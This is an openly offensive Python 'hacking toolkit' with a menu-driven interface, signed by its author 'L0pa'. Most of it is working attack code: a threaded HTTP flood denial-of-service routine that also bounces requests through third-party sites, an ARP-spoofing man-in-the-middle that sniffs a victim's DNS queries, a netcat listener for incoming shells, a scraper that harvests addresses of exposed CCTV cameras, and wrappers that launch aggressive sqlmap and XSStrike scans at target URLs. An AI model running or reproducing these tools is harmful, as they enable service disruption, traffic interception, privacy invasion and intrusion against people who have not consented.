# CODED BY L0PA :)

import getpass
import ipaddress
import json
import logging
import os
import random
import re
import socket
import subprocess
import sys
import threading
import time
import urllib.request
from queue import Queue

import colorama
import dns.resolver
import requests
import whois
from colorama import Fore, Style
from requests.structures import CaseInsensitiveDict
from scapy.all import sniff, ARP, send, DNSQR, IP

username = getpass.getuser()
colorama.init()

def close_program():
    text_animation(f"\n{Fore.RED}[💀] Closing The Program...{Style.RESET_ALL}\n", 0.02)


title = f"""{Fore.CYAN}
 ██╗      ██████╗ ██████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗
 ██║     ██╔═████╗██╔══██╗██║  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝
 ██║     ██║██╔██║██████╔╝███████║       ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║   
 ██║     ████╔╝██║██╔═══╝ ╚════██║       ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║   
 ███████╗╚██████╔╝██║          ██║       ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║   
 ╚══════╝ ╚═════╝ ╚═╝          ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   
                                                                                                                                                                 
{Style.RESET_ALL}"""

def text_animation(text, ms):
    for word in text:
        print(word, end='', flush=True)
        time.sleep(ms)


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def ask_next_action(current_tool_func, back_to_menu_func, prev_func):
    try:
        print(f"\n{Fore.YELLOW} [1] Repeat\n [2] {prev_func}\n [3] Main Menu{Style.RESET_ALL}")
        choice = input(f"{Fore.GREEN} root@{username}:~$ {Style.RESET_ALL}")
        if choice == "1":
            current_tool_func()
        elif choice == "2":
            clear()
            text_animation(title, 0.0005)
            back_to_menu_func()
        elif choice == "3":
            main()
        else:
            print(f"{Fore.RED}Invalid input. Returning to main menu.{Style.RESET_ALL}")
            main()
    except KeyboardInterrupt:
        close_program()



def whois_lookup():
    try:
        domain = input(f"{Fore.YELLOW}Target domain (e.g. example.com): {Style.RESET_ALL}")
        try:
            w = whois.whois(domain)
            print(f"{Fore.GREEN}{w}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}WHOIS error: {e}{Style.RESET_ALL}")
        ask_next_action(whois_lookup, web_hacking, "Web Hacking")

    except KeyboardInterrupt:
        close_program()



def dns_lookup():
    try:
        domain = input(f"{Fore.YELLOW}Target domain (e.g. example.com): {Style.RESET_ALL}")
        try:
            result = dns.resolver.resolve(domain, 'A')
            for ip in result:
                print(f"{Fore.GREEN}[+] IP: {ip}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}DNS error: {e}{Style.RESET_ALL}")
        ask_next_action(dns_lookup, web_hacking, "Web Hacking")
    except KeyboardInterrupt:
        close_program()



def load_wordlist(file_path):
    """Load keywords from the wordlist file."""
    try:
        with open(file_path, 'r') as file:
            wordlist = [line.strip() for line in file if line.strip()]
        if wordlist:
            print(f"{Fore.GREEN}[+] Loaded {len(wordlist)} subdomain keywords from {file_path}{Style.RESET_ALL}")
            return wordlist
        else:
            print(f"{Fore.RED}[-] The wordlist file is empty.{Style.RESET_ALL}")
            return []
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Wordlist file not found: {file_path}{Style.RESET_ALL}")
        return []



def subdomain_scanner():
    try:
        domain = input(f"{Fore.YELLOW}Target domain (e.g. example.com): {Style.RESET_ALL}")
        wordlist = load_wordlist("big.txt")

        if not wordlist:
            print(f"{Fore.RED}Aborting scan: no subdomains loaded.{Style.RESET_ALL}")
            ask_next_action(subdomain_scanner, web_hacking, "Web Hacking")
            return

        print(f"\n{Fore.YELLOW}[*] Scanning subdomains...{Style.RESET_ALL}")
        for sub in wordlist:
            url = f"{sub}.{domain}"
            try:
                socket.gethostbyname(url)
                print(f"{Fore.GREEN}[+] Found: {url}{Style.RESET_ALL}")
            except socket.gaierror:
                continue
        ask_next_action(subdomain_scanner, web_hacking, "Web Hacking")
    except KeyboardInterrupt:
        close_program()



def port_scanner():
    try:
        target = input(f"{Fore.YELLOW}Target IP or domain: {Style.RESET_ALL}")
        ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 8080]
        print(f"{Fore.YELLOW}[*] Scanning ports...{Style.RESET_ALL}")
        for port in ports:
            s = socket.socket()
            s.settimeout(1)
            try:
                s.connect((target, port))
                print(f"{Fore.GREEN}[+] Port {port} is OPEN{Style.RESET_ALL}")
            except:
                pass
            s.close()
        ask_next_action(port_scanner, web_hacking, "Web Hacking")
    except KeyboardInterrupt:
        close_program()


def run_WPScan():
    pass


def web_hacking():
    try:
        clear()
        text_animation(title, 0.0005)

        text_animation(f"                                \033[1;37mCreated by \033[1;31mL0pa 💻\033[0m\n", 0.0005)
        text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@_.l0pa._\n\n{Style.RESET_ALL}", 0.0005)

        print(f"{Fore.LIGHTCYAN_EX} --- Web Hacking ---{Style.RESET_ALL}")


        print(f"{Fore.CYAN}\n [{Fore.WHITE}1{Fore.CYAN}] SQLMap\n [{Fore.WHITE}2{Fore.CYAN}] xsstrike\n [{Fore.WHITE}3{Fore.CYAN}] WPScan\n [{Fore.WHITE}4{Fore.CYAN}] WHOIS Lookup\n [{Fore.WHITE}5{Fore.CYAN}] DNS Lookup\n [{Fore.WHITE}6{Fore.CYAN}] Subdomain Scanner\n [{Fore.WHITE}7{Fore.CYAN}] Port Scanner\n\n [{Style.RESET_ALL}{Fore.RED}0{Fore.CYAN}] Menu{Style.RESET_ALL}\n")
        s = input(f"{Fore.GREEN} root@{username}/WebHacking:~$ {Style.RESET_ALL}")


        if s == "1" or s == "2":
            url = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter Target URL: {Style.RESET_ALL}")
            if (s) == "1": run_sqlmap(url)
            elif s == "2": run_xsstrike(url)
            elif s == "3": run_WPScan()
        
        match (s):
            case "4":
                whois_lookup()
            case "5":
                dns_lookup()
            case "6":
                subdomain_scanner()
            case "7":
                port_scanner()
            case "0":
                main()
            case _:
                web_hacking()
    except KeyboardInterrupt:
        close_program()
            


def run_sqlmap(url):
    try:
        command = f"sqlmap -u {url} --batch --level=5 --risk=3"
        subprocess.run(command, shell=True)
        ask_next_action(run_sqlmap, web_hacking, "Web Hacking")
    except KeyboardInterrupt:
        close_program()


def run_xsstrike(url):
    try:
        command = f"python3 tools/XSStrike/xsstrike.py -u {url} --crawl"
        subprocess.run(command, shell=True)
        ask_next_action(run_xsstrike, web_hacking, "Web Hacking")
    except KeyboardInterrupt:
        close_program()



def remote_access():
    text_animation(f"{Fore.RED}Coming Soon...{Style.RESET_ALL}", 0.01)
    time.sleep(1)
    main()


def wireless_tools():
    text_animation(f"{Fore.RED}Coming Soon...{Style.RESET_ALL}", 0.01)
    time.sleep(1)
    main()


def osint():
    try:
        clear()
        text_animation(title, 0.0005)

        text_animation(f"                                \033[1;37mCreated by \033[1;31mL0pa 💻\033[0m\n", 0.0005)
        text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@_.l0pa._\n\n{Style.RESET_ALL}", 0.0005)

        print(f"{Fore.LIGHTCYAN_EX} --- OSINT ---{Style.RESET_ALL}\n")

        print(f"{Fore.GREEN}+{'-'*37}+{'-'*37}+{Style.RESET_ALL}")
        print(f"{Fore.GREEN}|{Style.RESET_ALL}          {Fore.YELLOW}--- Usernames ---{Style.RESET_ALL}          {Fore.GREEN}|{Style.RESET_ALL}          {Fore.YELLOW}--- Instagram ---{Style.RESET_ALL}          {Fore.GREEN}|{Style.RESET_ALL}")
        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}1{Style.RESET_ALL}] Sherlock                       {Fore.GREEN} |{Style.RESET_ALL} [{Fore.WHITE}1{Style.RESET_ALL}] Toutatis                       {Fore.GREEN} |{Style.RESET_ALL}")
        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}2{Style.RESET_ALL}] Maigret                        {Fore.GREEN} |{Style.RESET_ALL} [{Fore.WHITE}2{Style.RESET_ALL}] Osintgram                      {Fore.GREEN} |{Style.RESET_ALL}")
        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}3{Style.RESET_ALL}] Blackbird                      {Fore.GREEN} |{Style.RESET_ALL} [{Fore.WHITE}3{Style.RESET_ALL}] Instaloader                    {Fore.GREEN} |{Style.RESET_ALL}")
        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}4{Style.RESET_ALL}] What's my name                  {Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}4{Style.RESET_ALL}] IgScraper                     {Fore.GREEN}  |{Style.RESET_ALL}")
        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}5{Style.RESET_ALL}] SocialScan                     {Fore.GREEN} |{Style.RESET_ALL} [{Fore.WHITE}5{Style.RESET_ALL}] InstaLooter                    {Fore.GREEN} |{Style.RESET_ALL}")
        print(f"{Fore.GREEN}+{'-'*37}+{'-'*37}+{Style.RESET_ALL}")

        print(f"{Fore.GREEN}+{'-'*37}+{'-'*37}+{Style.RESET_ALL}")
        print(f"{Fore.GREEN}|{Style.RESET_ALL}          {Fore.YELLOW}--- Email ---{Style.RESET_ALL}            {Fore.GREEN}  | {Style.RESET_ALL}          {Fore.YELLOW}--- Frameworks ---{Style.RESET_ALL}        {Fore.GREEN}|{Style.RESET_ALL}")
        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}1{Style.RESET_ALL}] Holehe                         {Fore.GREEN} |{Style.RESET_ALL} [{Fore.WHITE}1{Style.RESET_ALL}] Recon-ng                  {Fore.GREEN}      |{Style.RESET_ALL}")
        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}2{Style.RESET_ALL}] Eyes                           {Fore.GREEN} |{Style.RESET_ALL} [{Fore.WHITE}2{Style.RESET_ALL}] Mr.Holmes                       {Fore.GREEN}|{Style.RESET_ALL}")
        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}3{Style.RESET_ALL}] GHunt                          {Fore.GREEN} |{Style.RESET_ALL} [{Fore.WHITE}3{Style.RESET_ALL}] Spiderfoot                      {Fore.GREEN}|{Style.RESET_ALL}")
        print(f"{Fore.GREEN}+{'-'*37}+{'-'*37}+{Style.RESET_ALL}\n")

        print(f" [{Style.RESET_ALL}{Fore.RED}0{Style.RESET_ALL}] {Fore.CYAN}Menu{Style.RESET_ALL}\n")

        s = input(f"{Fore.GREEN} root@{username}/OSINT:~$ {Style.RESET_ALL}")

    except KeyboardInterrupt:
        close_program()



################################# DOS ATTACK ##############################################

def dos():
    try:
        clear()

        text_animation(title, 0.0005)

        def load_user_agents():
            global uagent
            uagent = [
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
                "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
                "Mozilla/5.0 (Windows; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
                "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
                "Mozilla/5.0 (Windows; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
                "Mozilla/5.0 (Windows; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
            ]

        def load_bots():
            global bots
            bots = [
                "http://validator.w3.org/check?uri=",
                "http://www.facebook.com/sharer/sharer.php?u="
            ]

        def bot_attack(url):
            try:
                while True:
                    req = urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)})
                    urllib.request.urlopen(req)
                    print("\033[94m [Bot] Sending indirect attack request...\033[0m")
                    time.sleep(0.1)
            except:
                time.sleep(0.1)

        def direct_attack(item):
            try:
                while True:
                    packet = str(f"GET / HTTP/1.1\nHost: {host}\n\nUser-Agent: {random.choice(uagent)}\n{data}").encode('utf-8')
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, int(port)))
                    if s.sendto(packet, (host, int(port))):
                        s.shutdown(socket.SHUT_WR)
                        print(f"\033[92m[{time.ctime()}] Packet sent successfully\033[0m \033[94m<-- HaxL0p4 packet -->\033[0m")
                    else:
                        print("\033[91m Connection closed unexpectedly\033[0m")
                    time.sleep(0.1)
            except socket.error:
                print("\033[91m [!] Connection error! Target may be down.\033[0m")
                time.sleep(0.1)

        def attack_thread():
            while True:
                item = q.get()
                direct_attack(item)
                q.task_done()

        def bot_thread():
            while True:
                item = w.get()
                bot_attack(random.choice(bots) + "http://" + host)
                w.task_done()

        def get_user_input():
            global host, port, threads

            host = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter Target URL: {Style.RESET_ALL}")
            port = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter target port (default 80): {Style.RESET_ALL}") or "80"
            threads = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter number of threads (default 135): {Style.RESET_ALL}") or "135"


            print(f"\n\033[92mTarget: {host} | Port: {port} | Threads: {threads}\033[0m")
            text_animation("\033[94mPreparing attack...\033[0m\n", 0.03)

        # Queues for threading
        q = Queue()
        w = Queue()

        # Read headers
        with open("headers.txt", "r") as headers:
            global data
            data = headers.read()

        get_user_input()
        load_user_agents()
        load_bots()

        # Test connection
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            s.settimeout(1)
        except socket.error:
            print("\033[91m [!] Could not connect to the target. Check host/port.\033[0m")
            sys.exit()

        # Start threads
        for _ in range(int(threads)):
            t = threading.Thread(target=attack_thread)
            t.daemon = True
            t.start()
            t2 = threading.Thread(target=bot_thread)
            t2.daemon = True
            t2.start()

        # Task queue
        item = 0
        while True:
            if item > 1800:
                item = 0
                time.sleep(0.1)
            item += 1
            q.put(item)
            w.put(item)

        q.join()
        w.join()

    except KeyboardInterrupt:
        close_program()

########################################## END DOS ATTACK ###################################################

def netcat_listener():
    try:
        clear()

        text_animation(title, 0.0005)
        port = input(f"\n{Fore.YELLOW}Port: {Style.RESET_ALL}")
        text_animation(f"\n{Fore.YELLOW}CTRL+C for return to menu...{Style.RESET_ALL}\n", 0.02)
        try:
            subprocess.run(["nc", "-lvp", port])
        except KeyboardInterrupt:
            text_animation(f"\n {Fore.RED}[!] Connection Closed... Return to main menu...{Style.RESET_ALL}", 0.02)
            time.sleep(1)
            main()
    except KeyboardInterrupt:
        close_program()


def network():
    try:
        clear()
        text_animation(title, 0.0005)
        print(f"\n{Fore.LIGHTCYAN_EX} --- Network ---{Style.RESET_ALL}\n")
        print(f" {Fore.CYAN}[{Fore.WHITE}1{Fore.CYAN}] Network Scanner")
        print(f" [{Fore.WHITE}2{Fore.CYAN}] Port Scanner")
        print(f" [{Fore.WHITE}3{Fore.CYAN}] Web Spy")
        print(f" [{Fore.WHITE}4{Fore.CYAN}] Netcat Listener")
        print(f" [{Fore.BLACK}5{Fore.CYAN}] Evil Portal")
        print(f"\n [{Style.RESET_ALL}{Fore.RED}0{Fore.CYAN}] Menu{Style.RESET_ALL}")

        choice = input(f"{Fore.GREEN} root@{username}/network:~$ {Style.RESET_ALL}")

        match (choice):
            case "1":
                net_scan()
            case "2":
                port_scanner()
            case "3":
                web_spoof()
            case "4":
                netcat_listener()
            case "0":
                main()
    except KeyboardInterrupt:
        close_program()



def net_scan():
    try:
        text_animation(f"\n{Fore.RED}[*] Scanning local network using ARP...{Style.RESET_ALL}", 0.02)
        print("\n")
        os.system("sudo arp-scan -l")
    except KeyboardInterrupt:
        close_program()

    
    ask_next_action(net_scan, network, "Network")   


def enable_promiscuous(iface):
    os.system(f"sudo ip link set {iface} promisc on")


def arp_spoof(victim_ip, gateway_ip, iface):
    pkt_to_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
    pkt_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)
    print(f"{Fore.CYAN}[*] Starting ARP spoofing (MITM)...{Style.RESET_ALL}")
    try:
        while True:
            send(pkt_to_victim, iface=iface, verbose=False)
            send(pkt_to_gateway, iface=iface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] ARP spoofing stopped.{Style.RESET_ALL}")

def dns_sniffer(iface, target_ip=""):
    def process_packet(packet):
        if packet.haslayer(DNSQR) and packet.haslayer(IP):
            if not target_ip or packet[IP].src == target_ip:
                try:
                    domain = packet[DNSQR].qname.decode('utf-8')
                    print(f"{Fore.GREEN}[+] {packet[IP].src} requested: {domain}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error decoding DNS request: {e}{Style.RESET_ALL}")
    sniff(filter="udp port 53", iface=iface, prn=process_packet, store=False)




def web_spoof():
    try:
        iface = input(f"{Fore.YELLOW}Interface (e.g., wlan0): {Style.RESET_ALL}")
        victim_ip = input(f"{Fore.YELLOW}Victim IP > {Style.RESET_ALL}")
        gateway_ip = input(f"{Fore.YELLOW}Gateway IP > {Style.RESET_ALL}")

        enable_promiscuous(iface)

        os.system("sudo sysctl -w net.ipv4.ip_forward=1")

        os.system(f"sudo iptables -t nat -A POSTROUTING -o {iface} -j MASQUERADE")

        spoof_thread = threading.Thread(target=arp_spoof, args=(victim_ip, gateway_ip, iface), daemon=True)
        spoof_thread.start()

        print(f"{Fore.CYAN}\n[*] Sniffing DNS traffic from {victim_ip} on {iface}... Press Ctrl+C to stop.{Style.RESET_ALL}")
        try:
            dns_sniffer(iface, victim_ip)
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Sniffing stopped.{Style.RESET_ALL}")
    except KeyboardInterrupt:
        close_program()



def get_public_ip():
    r = requests.get("https://api.ipify.org")
    return r.text


def ip_geo():
    try:
        clear()
        text_animation(title, 0.0005)

        public_ip = get_public_ip()
        print(f"\n Your ip address: {Fore.RED}{public_ip}{Style.RESET_ALL}")
        print(f'\n Type "{Fore.RED}0{Style.RESET_ALL}" for return back')

        target_ip = input(f"{Fore.RED} TARGET IP: {Style.RESET_ALL}")

        if target_ip == "0":
            main()
        
        request_url = 'https://geolocation-db.com/jsonp/' + target_ip
        response = requests.get(request_url)
        result = response.content.decode()
        result = result.split("(")[1].strip(")")
        result = json.loads(result)

        print("\n Geolocation Information:")
        print(f" Country Code: {Fore.YELLOW}{result['country_code']}{Style.RESET_ALL}")
        print(f" Country Name: {Fore.YELLOW}{result['country_name']}{Style.RESET_ALL}")
        print(f" City: {Fore.YELLOW}{result['city']}{Style.RESET_ALL}")
        print(f" Postal Code: {Fore.RED}{result['postal']}{Style.RESET_ALL}")
        print(f" Latitude: {Fore.CYAN}{result['latitude']}{Style.RESET_ALL}")
        print(f" Longitude: {Fore.CYAN}{result['longitude']}{Style.RESET_ALL}")
        print(f" IPv4 Address: {Fore.GREEN}{result['IPv4']}{Style.RESET_ALL}")
        print(f" State: {Fore.GREEN}{result['state']}{Style.RESET_ALL}")

        back = input(f"\n{Fore.RED} [❔] Back Y/N: {Style.RESET_ALL}")

        if back.lower() == "y":
            main()
        elif back.lower() == "n":
            sys.exit()
        else:
            print("Option Not Valid...")
    except KeyboardInterrupt:
        close_program()


def typewriter(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()



def banner():
    clear()
    print("\033[1;32m")
    print(" ▄████▄   ▄████▄  ▄▄▄█████▓ ██▒   █▓")
    print("▒██▀ ▀█  ▒██▀ ▀█  ▓  ██▒ ▓▒▓██░   █▒")
    print("▒▓█    ▄ ▒▓█    ▄ ▒ ▓██░ ▒░ ▓██  █▒░")
    print("▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒░ ▓██▓ ░   ▒██ █░░")
    print("▒ ▓███▀ ░▒ ▓███▀ ░  ▒██▒ ░    ▒▀█░  ")
    print("░ ░▒ ▒  ░░ ░▒ ▒  ░  ▒ ░░      ░ ▐░  ")
    print("░  ▒     ░  ▒       ░       ░ ░░    ")
    print("░        ░          ░           ░░  ")
    print("░ ░      ░ ░                     ░  ")
    print("░        ░                      ░   ")
    print("         \033[1;37mCreated by \033[1;31mL0pa 💻\033[0m\n")
    typewriter("\033[1;36m[~] Initializing access to unsecured CCTV feeds...\033[0m", 0.03)

def CCTV():
    try:
        banner()
        url = "http://www.insecam.org/en/jsoncountries/"
        headers = CaseInsensitiveDict()
        headers["Accept"] = "*/*"
        headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64)"

        country = None
        try:
            typewriter("\033[1;34m[+] Retrieving country codes...\033[0m", 0.02)
            resp = requests.get(url, headers=headers)

            try:
                data = resp.json()
                countries = data.get('countries', {})
            except Exception:
                print("\033[1;33m[!] Warning: Could not parse JSON. Falling back to legacy mode...\033[0m")
                countries = {}

            if not countries:
                print("\033[1;33m[!] Could not load country list. Enter code manually.\033[0m")
            else:
                print("\n\033[1;32m=== Available Country Codes ===\033[0m")
                for key, value in countries.items():
                    print(f'\033[1;36mCode: ({key}) - {value["country"]} ({value["count"]})\033[0m')

            print("")
            country = input("\033[1;33m[?] Enter country code (e.g. JP, RU, US): \033[0m").strip().upper()

            typewriter(f"\033[1;34m[+] Scanning feeds in region: {country}...\033[0m", 0.03)
            res = requests.get(f"http://www.insecam.org/en/bycountry/{country}", headers=headers)
            last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)
            last_page = int(last_page[0]) if last_page else 1

            with open(f'{country}.txt', 'w') as f:
                for page in range(last_page):
                    res = requests.get(
                        f"http://www.insecam.org/en/bycountry/{country}/?page={page}",
                        headers=headers
                    )
                    find_ip = re.findall(r"http://\d+\.\d+\.\d+\.\d+:\d+", res.text)
                    for ip in find_ip:
                        print(f"\033[1;31m[+] Found cam: {ip}\033[0m")
                        f.write(f'{ip}\n')
                        time.sleep(0.05)

        except Exception as e:
            print(f"\033[1;31m[!] Error during execution: {e}\033[0m")

        finally:
            if country:
                print(f"\n\033[1;32m[✓] Feeds saved to file: \033[1;37m{country}.txt\033[0m")
            else:
                print("\033[1;33m[~] No feeds saved due to earlier error.\033[0m")
            print("\033[1;30m[>] Exiting session...\033[0m")
            time.sleep(1)
            exit()
    except KeyboardInterrupt:
        main()



def update_lopa_toolkit():
    text_animation(f"\n{Fore.YELLOW}[+] Starting Upgrade...{Style.RESET_ALL}", 0.02)
    try:
        subprocess.run("git stash && git pull", shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        main()
    except subprocess.CalledProcessError:
        text_animation(f"\n{Fore.RED}[-] Error During The Update!...{Style.RESET_ALL}", 0.02)


def main():
    try:
        clear()
        text_animation(title, 0.0005)

        text_animation(f"                                \033[1;37mCreated by \033[1;31mL0pa 💻\033[0m\n", 0.0005)
        text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@_.l0pa._\n\n{Style.RESET_ALL}", 0.0005)

        print(f"{Fore.LIGHTCYAN_EX} --- Main Menu ---\t\t --- Coming Soon ---{Style.RESET_ALL}")

        print(f"{Fore.CYAN}\n [{Fore.WHITE}1{Fore.CYAN}] Web Hacking\t\t[{Fore.WHITE}6{Fore.CYAN}] Phishing\n [{Fore.WHITE}2{Fore.CYAN}] Network\t\t\t[{Fore.WHITE}7{Fore.CYAN}] Wireless Tools \t\t\n [{Fore.WHITE}3{Fore.CYAN}] DoS Attack\t\t\t[{Fore.WHITE}8{Fore.CYAN}] Osint\n [{Fore.WHITE}4{Fore.CYAN}] Ip Geolocation\n [{Fore.WHITE}5{Fore.CYAN}] CCTV Cam's\n\n [{Style.RESET_ALL}{Fore.RED}0{Fore.CYAN}]  Exit\n [{Style.RESET_ALL}{Fore.YELLOW}99{Fore.CYAN}] Update L0p4 Toolkit{Style.RESET_ALL}\n")
        s = input(f"{Fore.GREEN} root@{username}:~$ {Style.RESET_ALL}")

        match s:
            case "1":
                web_hacking()
            case "2":
                network()
            case "3":
                dos()
            case "4":
                ip_geo()
            case "5":
                CCTV()
            case "6":
                remote_access()
            case "7":
                wireless_tools()
            case "8":
                osint()
            case "99":
                update_lopa_toolkit()
            case "0":
                close_program()
            case _:
                print(f"{Fore.RED}Invalid input.{Style.RESET_ALL}")
                main()
    except KeyboardInterrupt:
        close_program()



if __name__ == '__main__':
    main()  
